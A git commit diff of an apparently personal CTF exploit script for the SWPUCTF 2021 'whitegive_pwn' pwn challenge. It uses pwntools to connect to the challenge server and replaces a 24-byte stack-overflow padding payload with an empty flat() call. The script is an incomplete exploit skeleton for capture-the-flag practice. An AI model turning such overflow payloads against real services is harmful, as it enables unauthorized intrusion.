b44384f22892eaa52e26d34c86e278f1bdab4dbd
Mel-SRK <3203216748@qq.com>
2026-04-23 12:58:17 +0800

    Updata somethin...

--- ctf/pwn/nss/[SWPUCTF 2021 新生赛]whitegive_pwn/exp.py
+++ ctf/pwn/nss/[SWPUCTF 2021 新生赛]whitegive_pwn/exp.py
@@ -1,9 +1,9 @@
 from pwn import *
 from LibcSearcher import *
-
+context(arch='amd64',os='linux',log_level='debug')
 p=remote('node7.anna.nssctf.cn',29682)
 
-payload=b'a'*(16+8)
+payload=flat([])
 
 
 
